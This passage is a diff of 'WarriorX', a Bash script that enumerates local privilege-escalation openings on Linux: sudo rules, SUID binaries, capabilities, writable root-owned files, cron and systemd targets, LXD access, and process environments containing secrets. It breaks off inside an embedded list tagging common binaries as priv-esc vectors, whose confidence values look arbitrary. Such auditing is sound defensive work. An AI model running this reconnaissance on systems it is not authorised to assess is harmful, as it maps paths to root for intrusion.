@@ -1,446 +1,9020 @@
 #!/usr/bin/env bash
+# WarriorX
+
+
+VERSION="1.1"
+
+USE_COLOR=1
+SHOW_HELP=0
+
+if [ -t 1 ]; then
+  :
+else
+  USE_COLOR=0
+fi
+
+for arg in "$@"; do
+  case "$arg" in
+    -h|--help)
+      SHOW_HELP=1
+      ;;
+    --no-color)
+      USE_COLOR=0
+      ;;
+    -q|--quiet)
+      QUIET=1
+      ;;
+  esac
+done
+
+if [ "${SHOW_HELP:-0}" -eq 1 ]; then
+  cat <<'EOF'
+WarriorX
+
+Usage:
+  ./warriorx.sh [options]
+
+Options:
+  -h, --help      Show this help
+  --no-color      Disable colored output
+  -q, --quiet     Reduce non-finding output
+
+Severity colors:
+  CRITICAL  red
+  HIGH      yellow
+  MEDIUM    blue
+  LOW       plain
+
+Confidence colors:
+  VERY HIGH red
+  HIGH      yellow
+  MEDIUM    blue
+  LOW       plain
+EOF
+  exit 0
+fi
+
+if [ "${USE_COLOR:-1}" -eq 1 ]; then
+  C_RESET='\033[0m'
+  C_RED='\033[1;31m'
+  C_YELLOW='\033[1;33m'
+  C_BLUE='\033[1;34m'
+  C_CYAN='\033[1;36m'
+else
+  C_RESET=''
+  C_RED=''
+  C_YELLOW=''
+  C_BLUE=''
+  C_CYAN=''
+fi
+
+color_wrap() {
+  local color="$1"
+  shift
+  printf '%b%s%b' "$color" "$*" "$C_RESET"
+}
+
+print_confidence_colored() {
+  local level="$1"
+  case "$level" in
+    "VERY HIGH") printf '%b\n' "$(color_wrap "$C_RED" "[CONFIDENCE] $level")" ;;
+    "HIGH")      printf '%b\n' "$(color_wrap "$C_YELLOW" "[CONFIDENCE] $level")" ;;
+    "MEDIUM")    printf '%b\n' "$(color_wrap "$C_BLUE" "[CONFIDENCE] $level")" ;;
+    *)           printf '[CONFIDENCE] %s\n' "$level" ;;
+  esac
+}
+
 set -u
 IFS=$'\n\t'
 
-VERSION="171"
-HOSTNAME_VALUE="$(hostname 2>/dev/null || echo unknown)"
-START_TIME="$(date +%s)"
-RUN_ID="$(date +%s)"
-LOGFILE="/tmp/warrior_${RUN_ID}.log"
+LOGFILE="${LOGFILE:-/tmp/warriorX.log}"
+TMPDIR="/tmp/warriorx.$$"
+mkdir -p "$TMPDIR" 2>/dev/null || {
+  echo "Cannot create temp directory: $TMPDIR" >&2
+  exit 1
+}
 
-PROFILE="normal"
-NO_COLOR=0
+cleanup() {
+  rm -rf "$TMPDIR" 2>/dev/null || true
+}
+trap cleanup EXIT
 
-RED='\033[0;31m'
-ORANGE='\033[38;5;208m'
-YELLOW='\033[1;33m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-CYAN='\033[0;36m'
-WHITE='\033[1;37m'
-NC='\033[0m'
+: >"$LOGFILE" 2>/dev/null || {
+  echo "Cannot write to $LOGFILE" >&2
+  exit 1
+}
 
-TOTAL_RISK_POINTS=0
-TOTAL_FINDINGS=0
+exec > >(tee -a "$LOGFILE") 2>&1
 
-declare -A SEVERITY_COUNT=([CRITICAL]=0 [HIGH]=0 [MEDIUM]=0 [INFO]=0)
-declare -A CATEGORY_COUNT=()
+declare -a FINDINGS=()
 declare -A SEEN=()
+declare -A GRAPH=()
+declare -A SCORE=()
+declare -A PROB=()
 
-declare -a ALL_FINDINGS=()
-declare -a ROOT_IMPACT_FINDINGS=()
+section() { printf '
+%b
+' "$(color_wrap "$C_CYAN" "========== $1 ==========")"; }
+note()    { printf '[NOTE] %s
+' "$1"; }
+hint()    { printf '%b
+' "$(color_wrap "$C_BLUE" "[HINT] $1")"; }
+have()    { command -v "$1" >/dev/null 2>&1; }
 
-lookup_kernel_reference() {
-  local kernel="$1"
-  local mm
-  mm="$(printf '%s' "$kernel" | awk -F. '{print $1 "." $2}')"
+add_finding() {
+  local sev="$1"; shift
+  local msg="$*"
+  local key="${sev}|${msg}"
 
-  case "$mm" in
-    4.4)  echo "Review legacy 4.4 kernel advisories and patch status." ;;
-    4.9)  echo "Review legacy 4.9 kernel advisories and patch status." ;;
-    5.4)  echo "Review 5.4 kernel advisories, including CVE-2021-3493 and CVE-2022-0847, against vendor patches." ;;
-    5.8)  echo "Review 5.8 kernel advisories, including CVE-2022-0847, against vendor patches." ;;
-    5.10) echo "Review 5.10 kernel advisories, including CVE-2022-2588, against vendor patches." ;;
-    5.15) echo "Review current 5.15 vendor advisories for local privilege escalation issues." ;;
-    6.1)  echo "Review current 6.1 vendor advisories for local privilege escalation issues." ;;
-    *)    echo "" ;;
-  esac
-}
+  [[ -n "${SEEN[$key]+x}" ]] && return
 
-lookup_component_reference() {
-  local component="$1"
-  case "$component" in
-    pkexec) echo "CVE-2021-4034" ;;
-    sudo) echo "CVE-2021-3156" ;;
-    docker.sock|/var/run/docker.sock) echo "Container runtime control surface present. Review local runtime exposure and related advisories." ;;
-    containerd.sock|/run/containerd/containerd.sock) echo "Container runtime control socket present. Review runtime access policy." ;;
-    podman.sock|/run/podman/podman.sock) echo "Podman service socket present. Review runtime access policy." ;;
-    overlayfs) echo "CVE-2023-0386" ;;
-    systemd) echo "Review installed systemd version against current vendor advisories." ;;
-    cron) echo "Review scheduled task ownership, trust boundaries, and relevant local advisories." ;;
-    openssh) echo "Review installed OpenSSH version against current vendor advisories." ;;
-    polkit) echo "Review installed polkit and pkexec version against current vendor advisories." ;;
-    *) echo "" ;;
-  esac
-}
-
-capability_reference() {
-  local line="$1"
-  if echo "$line" | grep -Eq "cap_setuid|cap_sys_admin|cap_dac_override"; then
-    echo "High-risk file capability present. Review binary purpose and trust boundary."
-  else
-    echo ""
-  fi
-}
-
-parse_args() {
-  while [ $# -gt 0 ]; do
-    case "$1" in
-      --quick) PROFILE="quick" ;;
-      --normal) PROFILE="normal" ;;
-      --deep) PROFILE="deep" ;;
-      --no-color) NO_COLOR=1 ;;
-      -h|--help)
-        sed -n '1,40p' "$0"
-        exit 0
-        ;;
-    esac
-    shift
-  done
-}
-
-init_colors() {
-  if [ "$NO_COLOR" -eq 1 ]; then
-    RED=''; ORANGE=''; YELLOW=''; GREEN=''; BLUE=''; CYAN=''; WHITE=''; NC=''
-  fi
-}
-
-banner() {
-  echo
-  echo -e "${WHITE}WARRIOR ${VERSION}${NC}"
-  echo -e "${CYAN}Host:${NC} ${HOSTNAME_VALUE}"
-  echo -e "${CYAN}Mode:${NC} ${PROFILE}"
-  echo -e "${CYAN}Log:${NC} ${LOGFILE}"
-  echo -e "${CYAN}Policy:${NC} read-only reporting"
-  echo
-}
-
-log_line() {
-  echo "[$(date '+%H:%M:%S')] $1" >> "$LOGFILE"
-}
-
-section() {
-  echo
-  echo -e "${CYAN}--------------------------------------------------${NC}"
-  echo -e "${WHITE}$1${NC}"
-  echo -e "${CYAN}--------------------------------------------------${NC}"
-}
-
-dedupe() {
-  local key="$1"
-  [[ ${SEEN[$key]+x} ]] && return 1
   SEEN["$key"]=1
-  return 0
-}
+  FINDINGS+=("$key")
 
-risk_points_for_confidence() {
-  local c="$1"
-  if [ "$c" -ge 90 ]; then echo 10
-  elif [ "$c" -ge 75 ]; then echo 7
-  elif [ "$c" -ge 60 ]; then echo 5
-  elif [ "$c" -ge 40 ]; then echo 3
-  else echo 1
-  fi
-}
+  case "$sev" in
+    CRITICAL) SCORE["$msg"]=10; PROB["$msg"]=0.90 ;;
+    HIGH)     SCORE["$msg"]=7;  PROB["$msg"]=0.75 ;;
+    MEDIUM)   SCORE["$msg"]=4;  PROB["$msg"]=0.55 ;;
+    LOW)      SCORE["$msg"]=1;  PROB["$msg"]=0.35 ;;
+    *)        SCORE["$msg"]=1;  PROB["$msg"]=0.30 ;;
+  esac
 
-grade_finding() {
-  local category="$1"
-  local target="$2"
-  local issue="$3"
-
-  case "${category}|${target}|${issue}" in
-    docker|/var/run/docker.sock|*"Docker socket exposed"*) echo "95|root" ;;
-    sockets|/var/run/docker.sock|*"Privileged runtime socket present"*) echo "95|root" ;;
-    cron|*|*"Writable cron command"*) echo "90|root" ;;
-    systemd|*|*"Writable service target"*) echo "90|root" ;;
-    sudo|*|*"Dangerous sudo rule"*) echo "85|root" ;;
-    capabilities|*|*"High-risk file capability present"*) echo "80|root" ;;
-    users|*|*"Privileged group membership"*) echo "65|root" ;;
-    filesystem|*|*"Writable root-owned file"*) echo "85|root" ;;
-    filesystem|*|*"Writable parent directory for privileged target"*) echo "55|root" ;;
-    env|*|*"Writable PATH directory"*) echo "75|root" ;;
-    secrets|*|*"SSH private key found"*) echo "80|user/service" ;;
-    secrets|*|*"Cloud credential found"*) echo "80|user/service" ;;
-    secrets|*|*"Database credential found"*) echo "70|user/service" ;;
-    secrets|*|*"Service token found"*) echo "70|user/service" ;;
-    secrets|*|*"Generic secret match"*) echo "55|user/service" ;;
-    suid|*|*"SUID binary present"*) echo "50|root" ;;
-    sgid|*|*"SGID binary present"*) echo "40|service/user" ;;
-    acl|*|*"ACL entry grants additional access"*) echo "55|contextual" ;;
-    process|*|*"Root script process observed"*) echo "40|root" ;;
-    kernel|*|*"Kernel version detected"*) echo "60|root" ;;
-    *) echo "30|unknown" ;;
+  case "$sev" in
+    CRITICAL) printf '%b\n' "$(color_wrap "$C_RED" "[${sev}] ${msg}")" ;;
+    HIGH)     printf '%b\n' "$(color_wrap "$C_YELLOW" "[${sev}] ${msg}")" ;;
+    MEDIUM)   printf '%b\n' "$(color_wrap "$C_BLUE" "[${sev}] ${msg}")" ;;
+    *)        printf '[%s] %s\n' "$sev" "$msg" ;;
   esac
 }
 
-color_for_confidence() {
-  local c="$1"
-  if [ "$NO_COLOR" -eq 1 ]; then echo ""; return; fi
-  if [ "$c" -ge 90 ]; then echo "$RED"
-  elif [ "$c" -ge 75 ]; then echo "$ORANGE"
-  elif [ "$c" -ge 60 ]; then echo "$YELLOW"
-  elif [ "$c" -ge 40 ]; then echo "$GREEN"
-  else echo "$BLUE"
+link_findings() {
+  local a="$1" b="$2"
+  [[ -n "$a" && -n "$b" ]] || return
+  case " ${GRAPH[$a]:-} " in
+    *" $b "*) ;;
+    *) GRAPH["$a"]+="$b " ;;
+  esac
+}
+
+show_file() {
+  local f="$1"
+  [[ -r "$f" ]] || return 0
+  printf -- '--- %s ---\n' "$f"
+  sed -n '1,200p' "$f" 2>/dev/null
+}
+
+safe_env_redacted() {
+  env | grep -Ei 'key|token|secret|pass|pwd|auth' | sed 's/=.*/=<redacted>/'
+}
+
+get_sudo_text() {
+  sudo -n -l 2>/dev/null || sudo -l 2>/dev/null || true
+}
+
+system_info() {
+  section "SYSTEM"
+  uname -a 2>/dev/null || true
+  id 2>/dev/null || true
+  pwd 2>/dev/null || true
+  date 2>/dev/null || true
+  [[ -r /etc/os-release ]] && cat /etc/os-release
+}
+
+kernel_context() {
+  section "KERNEL / PATCH CONTEXT"
+
+  local k
+  k="$(uname -r 2>/dev/null || true)"
+  printf 'Kernel: %s\n' "$k"
+
+  case "$k" in
+    5.8*|5.10*)
+      add_finding HIGH "Kernel family historically associated with well-known local privilege-boundary issues; verify vendor patch status"
+      ;;
+    4.*)
+      add_finding MEDIUM "Older kernel family detected; review local privilege-boundary fixes and support status"
+      ;;
+  esac
+
+  if have dpkg-query; then
+    echo "--- Selected package versions ---"
+    dpkg-query -W -f='${Package}\t${Version}\n' sudo openssh-server openssh-client polkitd policykit-1 systemd dbus docker.io containerd runc apparmor selinux-utils policycoreutils lxd lxc 2>/dev/null || true
+  elif have rpm; then
+    echo "--- Selected package versions ---"
+    rpm -q sudo openssh-server openssh-clients polkit systemd dbus docker containerd runc apparmor selinux-policy selinux-policy-targeted policycoreutils lxd lxc 2>/dev/null || true
   fi
 }
 
-label_for_confidence() {
-  local c="$1"
-  if [ "$c" -ge 90 ]; then echo "Very High"
-  elif [ "$c" -ge 75 ]; then echo "High"
-  elif [ "$c" -ge 60 ]; then echo "Moderate"
-  elif [ "$c" -ge 40 ]; then echo "Low"
-  else echo "Informational"
+sudo_review() {
+  section "SUDO POLICY"
+
+  SUDO_TEXT="$(get_sudo_text)"
+  [[ -n "$SUDO_TEXT" ]] && printf '%s\n' "$SUDO_TEXT"
+
+  grep -q 'NOPASSWD' <<<"$SUDO_TEXT" && add_finding CRITICAL "Passwordless sudo rules present"
+  grep -q 'SETENV'   <<<"$SUDO_TEXT" && add_finding HIGH     "SETENV allowed under sudo"
+  grep -Eq '\bALL\b' <<<"$SUDO_TEXT" && add_finding HIGH     "Broad sudo scope detected"
+}
+
+privileged_files() {
+  section "PRIVILEGED BINARIES / CAPABILITIES"
+
+  echo "--- SUID files ---"
+  find / -xdev -perm -4000 -type f 2>/dev/null | sort | tee "$TMPDIR/suid.list"
+
+  echo "--- SGID files ---"
+  find / -xdev -perm -2000 -type f 2>/dev/null | sort
+
+  if have getcap; then
+    echo "--- File capabilities ---"
+    getcap -r / 2>/dev/null | sort | tee "$TMPDIR/caps.list"
+    [[ -s "$TMPDIR/caps.list" ]] && add_finding HIGH "File capabilities present on system"
   fi
 }
 
-record_finding() {
-  local severity="$1" category="$2" target="$3" issue="$4" confidence="$5" impact="$6" points="$7"
-  local row="${points}|${confidence}|${severity}|${category}|${target}|${issue}|${impact}"
-  ALL_FINDINGS+=("$row")
-  [ "$impact" = "root" ] && ROOT_IMPACT_FINDINGS+=("$row")
+writable_surface() {
+  section "WRITABLE SURFACE"
+
+  echo "--- Key directories ---"
+  ls -ld /etc /usr /var /opt /tmp /var/tmp /dev/shm 2>/dev/null || true
+
+  echo "--- World-writable directories ---"
+  find / -xdev -type d -perm -0002 2>/dev/null | sort
+
+  echo "--- World-writable files ---"
+  find / -xdev -type f -perm -0002 2>/dev/null | sort | tee "$TMPDIR/world_writable_files.list"
+
+  echo "--- Root-owned files writable by current user ---"
+  find / -xdev -user root -writable 2>/dev/null | sort | tee "$TMPDIR/root_writable.list"
+
+  [[ -s "$TMPDIR/root_writable.list" ]] && add_finding CRITICAL "Root-owned writable files detected"
+  grep -q '^/etc' "$TMPDIR/world_writable_files.list" 2>/dev/null && add_finding CRITICAL "Writable file(s) under /etc"
 }
 
-sort_desc_take() {
-  local limit="$1"
-  shift
-  printf '%s\n' "$@" | awk 'NF' | sort -t'|' -k1,1nr -k2,2nr | head -n "$limit"
-}
+scheduled_tasks() {
+  section "SCHEDULED TASKS"
 
-report_item() {
-  local severity="$1"
-  local category="$2"
-  local target="$3"
-  local issue="$4"
-  local reference="${5:-}"
-  local cve="${6:-}"
+  show_file /etc/crontab
 
-  local dkey="${severity}|${category}|${target}|${issue}|${reference}|${cve}"
-  dedupe "$dkey" || return 0
+  echo "--- /etc/cron.d ---"
+  find /etc/cron.d -maxdepth 1 -type f -exec ls -l {} \; 2>/dev/null
 
-  local grade confidence impact color band points
-  grade="$(grade_finding "$category" "$target" "$issue")"
-  confidence="${grade%%|*}"
-  impact="${grade##*|}"
-  color="$(color_for_confidence "$confidence")"
-  band="$(label_for_confidence "$confidence")"
-  points="$(risk_points_for_confidence "$confidence")"
+  echo "--- User crontab ---"
+  crontab -l 2>/dev/null || true
 
-  printf "%b[%-8s]%b %-12s %-26s %s\n" "$color" "$severity" "$NC" "$category" "$target" "$issue"
-  printf "           %-12s %-26s %s\n" "" "Confidence" "${confidence}% (${band})"
-  printf "           %-12s %-26s %s\n" "" "Impact" "$impact"
-  printf "           %-12s %-26s %s\n" "" "Risk Points" "$points"
-  [ -n "$reference" ] && printf "           %-12s %-26s %s\n" "" "Reference" "$reference"
-  [ -n "$cve" ] && printf "           %-12s %-26s %s\n" "" "CVE / Label" "$cve"
-  printf "           %-12s %-26s %s\n" "" "Note" "Manual validation required"
-  echo
-
-  TOTAL_RISK_POINTS=$((TOTAL_RISK_POINTS + points))
-  TOTAL_FINDINGS=$((TOTAL_FINDINGS + 1))
-  SEVERITY_COUNT["$severity"]=$((SEVERITY_COUNT["$severity"] + 1))
-  CATEGORY_COUNT["$category"]=$(( ${CATEGORY_COUNT[$category]:-0} + 1 ))
-
-  record_finding "$severity" "$category" "$target" "$issue" "$confidence" "$impact" "$points"
-  log_line "$severity|$category|$target|$issue|confidence=${confidence}|impact=${impact}|points=${points}|reference=${reference}|cve=${cve}"
-}
-
-correlated_item() {
-  local severity="$1"
-  local summary="$2"
-  local impact="${3:-root}"
-  local confidence="${4:-90}"
-
-  local color band points
-  color="$(color_for_confidence "$confidence")"
-  band="$(label_for_confidence "$confidence")"
-  points="$(risk_points_for_confidence "$confidence")"
-
-  printf "%b[%-8s]%b %-12s %-26s %s\n" "$color" "$severity" "$NC" "correlated" "Likely risk path" "$summary"
-  printf "           %-12s %-26s %s\n" "" "Confidence" "${confidence}% (${band})"
-  printf "           %-12s %-26s %s\n" "" "Impact" "$impact"
-  printf "           %-12s %-26s %s\n" "" "Note" "Manual validation required"
-  echo
-
-  TOTAL_RISK_POINTS=$((TOTAL_RISK_POINTS + points))
-  TOTAL_FINDINGS=$((TOTAL_FINDINGS + 1))
-  SEVERITY_COUNT["$severity"]=$((SEVERITY_COUNT["$severity"] + 1))
-  CATEGORY_COUNT["correlated"]=$(( ${CATEGORY_COUNT[correlated]:-0} + 1 ))
-
-  local row="${points}|${confidence}|${severity}|correlated|Likely risk path|${summary}|${impact}"
-  ALL_FINDINGS+=("$row")
-  [ "$impact" = "root" ] && ROOT_IMPACT_FINDINGS+=("$row")
-  log_line "$severity|correlated|Likely risk path|${summary}|confidence=${confidence}|impact=${impact}|points=${points}"
-}
-
-overall_risk_score() {
-  if [ "$TOTAL_FINDINGS" -eq 0 ]; then echo 0; return; fi
-  local raw
-  raw=$(( TOTAL_RISK_POINTS * 100 / (TOTAL_FINDINGS * 10) ))
-  [ "$raw" -gt 100 ] && raw=100
-  echo "$raw"
-}
-
-overall_risk_label() {
-  local s="$1"
-  if [ "$s" -ge 85 ]; then echo "Critical Exposure"
-  elif [ "$s" -ge 70 ]; then echo "High Exposure"
-  elif [ "$s" -ge 50 ]; then echo "Moderate Exposure"
-  elif [ "$s" -ge 30 ]; then echo "Low Exposure"
-  else echo "Minimal Exposure"
+  if have systemctl; then
+    echo "--- systemd timers ---"
+    systemctl list-timers --all 2>/dev/null || true
   fi
+
+  grep -R root /etc/cron* 2>/dev/null | tee "$TMPDIR/cron_root.list" >/dev/null || true
+  [[ -s "$TMPDIR/cron_root.list" ]] && add_finding HIGH "Privileged (root) cron references present"
 }
 
-overall_risk_color() {
-  local s="$1"
-  if [ "$NO_COLOR" -eq 1 ]; then echo ""; return; fi
-  if [ "$s" -ge 85 ]; then echo "$RED"
-  elif [ "$s" -ge 70 ]; then echo "$ORANGE"
-  elif [ "$s" -ge 50 ]; then echo "$YELLOW"
-  elif [ "$s" -ge 30 ]; then echo "$GREEN"
-  else echo "$BLUE"
-  fi
-}
+services_review() {
+  section "SERVICES"
 
-cmd_exists() {
-  command -v "$1" >/dev/null 2>&1
-}
+  echo "--- root processes ---"
+  ps -eo user,pid,ppid,comm,args --sort=user 2>/dev/null | awk '$1=="root"{print}' | tee "$TMPDIR/root_ps.list"
 
-module_system() {
-  section "System"
-  local kernel
-  kernel="$(uname -r 2>/dev/null)"
-  report_item INFO kernel "$kernel" "Kernel version detected" "Kernel inventory" "$(lookup_kernel_reference "$kernel")"
-}
+  while read -r line; do
+    script="$(grep -oE '/[^ ]+\.(sh|py|pl|rb)' <<<"$line" | head -n1 || true)"
+    [[ -n "${script:-}" && -w "$script" ]] && add_finding CRITICAL "Writable script executed by privileged process: $script"
+  done < "$TMPDIR/root_ps.list"
 
-module_docker() {
-  section "Container"
-  [ -S /var/run/docker.sock ] && report_item CRITICAL docker "/var/run/docker.sock" "Docker socket exposed" "Container runtime control surface detected" "$(lookup_component_reference docker.sock)"
-}
+  if have systemctl; then
+    echo "--- writable unit files ---"
+    find /etc/systemd /lib/systemd /usr/lib/systemd -type f -writable 2>/dev/null | sort
 
-module_sudo() {
-  section "Sudo"
-  cmd_exists sudo || return 0
-  sudo -l 2>/dev/null | grep NOPASSWD | head -n 5 | while read -r line; do
-    report_item HIGH sudo "$line" "Dangerous sudo rule" "Review sudoers policy and allowed command scope manually" "$(lookup_component_reference sudo)"
-  done
-}
-
-module_suid() {
-  section "SUID"
-  find / -perm -4000 -type f 2>/dev/null | head -n 5 | while read -r f; do
-    report_item INFO suid "$f" "SUID binary present" "Review whether the binary is expected and safely configured"
-  done
-}
-
-module_service_chain() {
-  section "Service chain"
-  cmd_exists systemctl || return 0
-  systemctl list-unit-files --type=service 2>/dev/null | head -n 8 | while read -r svc; do
-    local name path
-    name="$(echo "$svc" | awk '{print $1}')"
-    [ -n "$name" ] || continue
-    systemctl cat "$name" 2>/dev/null | grep ExecStart | head -n 2 | while read -r line; do
-      path="$(echo "$line" | grep -oE '/[^ ]+' | head -n 1)"
-      [ -n "$path" ] && report_item INFO systemd "$name" "Service target: $path" "Review service execution chain manually" "$(lookup_component_reference systemd)"
-      [ -n "$path" ] && [ -w "$path" ] && report_item CRITICAL systemd "$path" "Writable service target" "Service target writability may affect trust boundary" "$(lookup_component_reference systemd)"
+    systemctl list-units --type=service --state=running --no-legend 2>/dev/null | awk '{print $1}' | while read -r svc; do
+      exec_line="$(systemctl show "$svc" 2>/dev/null | grep '^ExecStart=' | cut -d= -f2-)"
+      grep -oE '/[^ ;]+' <<<"$exec_line" | while read -r p; do
+        [[ -w "$p" ]] && add_finding CRITICAL "Writable service execution path (systemd): $p"
+      done
     done
+  fi
+}
+
+network_review() {
+  section "NETWORK"
+
+  ip addr 2>/dev/null || true
+  ip route 2>/dev/null || true
+  ip neigh 2>/dev/null || true
+
+  if have ss; then
+    echo "--- listeners ---"
+    ss -lntup 2>/dev/null || true
+  elif have netstat; then
+    netstat -lntup 2>/dev/null || true
+  fi
+
+  echo "--- mounts of interest ---"
+  mount 2>/dev/null | grep -Ei ' nfs| nfs4| cifs| smb| fuse| overlay' || true
+}
+
+isolation_review() {
+  section "CONTAINERS / NAMESPACES"
+
+  cat /proc/1/cgroup 2>/dev/null || true
+  ls -l /proc/self/ns 2>/dev/null || true
+  ls -l /.dockerenv /run/.containerenv 2>/dev/null || true
+
+  [[ -e /.dockerenv || -e /run/.containerenv ]] && add_finding MEDIUM "Container markers detected"
+}
+
+selinux_apparmor_review() {
+  section "SELINUX / APPARMOR"
+
+  if have getenforce; then
+    printf 'SELinux mode: %s\n' "$(getenforce 2>/dev/null)"
+  elif [[ -r /sys/fs/selinux/enforce ]]; then
+    printf 'SELinux enforce flag: %s\n' "$(cat /sys/fs/selinux/enforce 2>/dev/null)"
+  fi
+
+  [[ -r /etc/selinux/config ]] && show_file /etc/selinux/config
+
+  if [[ -r /sys/fs/selinux/enforce ]] && [[ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ]]; then
+    add_finding MEDIUM "SELinux present but not enforcing"
+  fi
+
+  if have aa-status; then
+    aa-status 2>/dev/null || true
+    aa-status 2>/dev/null | grep -qi 'processes are unconfined'      && add_finding MEDIUM "AppArmor reports unconfined processes"
+    aa-status 2>/dev/null | grep -qi 'profiles are in complain mode' && add_finding MEDIUM "AppArmor profiles in complain mode detected"
+  fi
+
+  [[ -d /etc/apparmor.d ]] && {
+    echo "--- AppArmor profiles ---"
+    find /etc/apparmor.d -maxdepth 2 -type f 2>/dev/null | sort
+  }
+}
+
+lxd_lxc_review() {
+  section "LXD / LXC"
+
+  id 2>/dev/null | grep -Eq '\blxd\b|\blxc\b' && add_finding CRITICAL "Current user is in lxd/lxc group"
+
+  echo "--- paths ---"
+  ls -ld /var/lib/lxd /var/snap/lxd/common/lxd /var/lib/lxc 2>/dev/null || true
+
+  echo "--- sockets ---"
+  ls -l /var/lib/lxd/unix.socket /var/snap/lxd/common/lxd/unix.socket 2>/dev/null || true
+
+  if have systemctl; then
+    systemctl is-active lxd 2>/dev/null | grep -q '^active$'              && add_finding HIGH "LXD service is active"
+    systemctl is-active snap.lxd.daemon 2>/dev/null | grep -q '^active$' && add_finding HIGH "snap LXD daemon is active"
+  fi
+
+  [[ -S /var/lib/lxd/unix.socket || -S /var/snap/lxd/common/lxd/unix.socket ]] && add_finding HIGH "LXD socket exposed on host"
+  find /var/lib/lxd /var/snap/lxd/common/lxd -maxdepth 2 -writable 2>/dev/null | grep -q . && add_finding HIGH "Writable LXD-related paths detected"
+}
+
+sensitive_files_review() {
+  section "SENSITIVE FILES"
+
+  echo "--- SSH paths ---"
+  ls -ld "$HOME/.ssh" "$HOME/.ssh/"* 2>/dev/null || true
+  ls -ld /root/.ssh /root/.ssh/* 2>/dev/null || true
+
+  echo "--- history files ---"
+  find /home "$HOME" /root -maxdepth 3 \( -name '.bash_history' -o -name '.zsh_history' -o -name '.mysql_history' -o -name '.psql_history' \) 2>/dev/null | sort
+
+  echo "--- config/backup-like files ---"
+  find /etc /opt /var /home -xdev \( -name '*.env' -o -name '*.conf' -o -name '*.ini' -o -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*.swp' -o -name '*~' \) 2>/dev/null | sort | head -n 400
+
+  echo "--- environment (redacted) ---"
+  safe_env_redacted
+}
+
+auth_review() {
+  section "AUTH / POLKIT / DBUS / PAM"
+
+  echo "--- PAM files ---"
+  find /etc/pam.d -maxdepth 1 -type f -exec ls -l {} \; 2>/dev/null
+
+  echo "--- polkit files ---"
+  find /etc/polkit-1 /usr/share/polkit-1 -maxdepth 3 \( -type f -o -type d \) 2>/dev/null | sort
+
+  echo "--- pkexec ---"
+  ls -l /usr/bin/pkexec 2>/dev/null || true
+  [[ -f /usr/bin/pkexec ]] && add_finding MEDIUM "pkexec present; verify patch status"
+
+  echo "--- dbus files ---"
+  find /etc/dbus-1 /usr/share/dbus-1 -maxdepth 3 -type f 2>/dev/null | sort
+}
+
+tooling_review() {
+  section "TOOLING / EXECUTION CONTEXT"
+
+  local x
+  for x in gcc cc make python python3 perl ruby php lua go javac node wget curl git ssh scp rsync docker podman flatpak snap lxc lxd; do
+    command -v "$x" >/dev/null 2>&1 && printf '%-12s %s\n' "$x" "$(command -v "$x")"
   done
 }
 
-module_acl_parent() {
-  section "ACL and parent directory analysis"
-  cmd_exists getfacl && getfacl -R /etc 2>/dev/null | grep 'user:' | head -n 5 | while read -r line; do
-    report_item INFO acl "/etc" "ACL entry grants additional access" "Review nonstandard ACLs manually"
-  done
+env_abuse_review() {
+  section "ENVIRONMENT ABUSE"
 
-  find /usr /opt /usr/local -type f 2>/dev/null | head -n 8 | while read -r f; do
-    local dir
-    dir="$(dirname "$f")"
-    [ -w "$dir" ] && report_item HIGH filesystem "$dir -> $f" "Writable parent directory for privileged target" "Parent directory control may affect trusted target"
+  env | grep -E "LD_PRELOAD|LD_LIBRARY_PATH|PATH=" 2>/dev/null || true
+
+  printf '%s\n' "${PATH:-}" | grep -q '\.'           && add_finding HIGH "PATH contains relative entry (.)"
+  env | grep -q '^LD_PRELOAD='                        && add_finding HIGH "LD_PRELOAD set"
+  env | grep -q '^LD_LIBRARY_PATH='                   && add_finding HIGH "LD_LIBRARY_PATH set"
+}
+
+library_paths_review() {
+  section "LIBRARY SEARCH PATHS"
+
+  find /lib /lib64 /usr/lib /usr/lib64 -type d -writable 2>/dev/null | sort | while read -r d; do
+    add_finding CRITICAL "Writable library directory: $d"
   done
 }
 
-module_secret_ranking() {
-  section "Secret ranking"
+runtime_review() {
+  section "RUNTIME (PROC/FD)"
 
-  find /home /root -type f \( -name "id_rsa" -o -name "id_ed25519" \) 2>/dev/null | head -n 3 | while read -r f; do
-    report_item HIGH secrets "$f" "SSH private key found" "Private key material may enable additional access"
+  find /proc -maxdepth 2 -name environ 2>/dev/null | while read -r f; do
+    strings "$f" 2>/dev/null | grep -Ei "key|token|pass|secret" >/dev/null && add_finding MEDIUM "Process environment may contain sensitive data: $f"
   done
 
-  grep -rEi 'AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AZURE_|GOOGLE_APPLICATION_CREDENTIALS' /home /var/www /opt 2>/dev/null | head -n 5 | while read -r l; do
-    report_item HIGH secrets "cloud credentials" "Cloud credential found" "Cloud credential material detected"
-  done
-
-  grep -rEi 'DB_PASSWORD|MYSQL_PASSWORD|POSTGRES_PASSWORD|DATABASE_URL' /home /var/www /opt 2>/dev/null | head -n 5 | while read -r l; do
-    report_item HIGH secrets "database config" "Database credential found" "Database credential material detected"
-  done
-
-  grep -rEi 'token|bearer|api[_-]?key|secret' /home /var/www /opt 2>/dev/null | head -n 5 | while read -r l; do
-    report_item INFO secrets "generic config" "Generic secret match" "Secret-like value found; classify manually"
+  find /proc -maxdepth 2 -type d -name fd 2>/dev/null | while read -r d; do
+    ls -l "$d" 2>/dev/null | grep -q "/etc" && add_finding MEDIUM "Open file descriptor referencing sensitive path under /etc: $d"
   done
 }
 
-module_correlation() {
-  section "Correlated findings"
 
-  [ -S /var/run/docker.sock ] && id 2>/dev/null | grep -q docker && \
-    correlated_item CRITICAL "User belongs to docker group and docker socket is exposed" root 95
+read -r -d '' GTFO_DB <<'EOF'
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
